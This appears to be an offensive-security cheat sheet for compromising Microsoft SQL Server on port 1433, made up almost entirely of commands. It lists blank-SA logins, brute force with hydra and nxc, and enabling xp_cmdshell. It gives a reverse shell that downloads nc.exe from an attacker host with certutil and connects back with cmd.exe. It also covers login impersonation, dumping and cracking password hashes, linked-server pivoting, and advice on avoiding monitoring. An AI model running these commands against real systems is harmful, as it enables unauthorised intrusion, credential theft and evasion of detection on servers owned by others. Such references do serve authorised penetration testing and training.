# MSSQL (1433)

!!! tip "Start here"
    Try SA with a blank password first: `impacket-mssqlclient sa:@10.10.10.10`. If you get in, run `xp_cmdshell 'whoami'` — it's often already enabled on unmanaged instances. If not, enable it with `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`.

!!! warning "Watch out"
    `xp_cmdshell` execution is logged. Use it to establish a shell quickly, then move to a less monitored method.

---

## Enumeration

```bash
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config 10.10.10.10
```

---

## Authentication

```bash
impacket-mssqlclient sa:@10.10.10.10
impacket-mssqlclient 'EXAMPLE/username':'password'@10.10.10.10 -windows-auth
```

---

## Brute Force

```bash
nxc mssql 10.10.10.10 -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt mssql://10.10.10.10
```

---

## xp_cmdshell RCE

Enable if disabled:
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Execute commands:
```sql
EXEC xp_cmdshell 'whoami';
```

Reverse shell via certutil + nc:
```sql
EXEC xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>:8000/nc.exe C:\users\public\nc.exe';
EXEC xp_cmdshell 'C:\users\public\nc.exe <attacker-ip> 9001 -e cmd.exe';
```

---

## User Impersonation

Check who can be impersonated with the current login:
```sql
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

Switch to that login:
```sql
EXECUTE AS LOGIN = 'sa';
```

---

## Credential Extraction

```sql
SELECT name, password_hash FROM sys.sql_logins;
```

```bash
hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Quick SQL Reference

```sql
SELECT name FROM master..sysdatabases;                              -- list databases
USE database_name; SELECT name FROM sysobjects WHERE xtype='U';    -- list tables
SELECT * FROM table_name;                                           -- dump table
```

!!! tip "Real-world"
    SA with a blank password is more common than it should be, especially on developer workstations and legacy installations. On internal assessments, also check for linked servers (`SELECT * FROM sys.servers`) — a low-privilege MSSQL instance linked to a high-privilege one is a common lateral movement path.
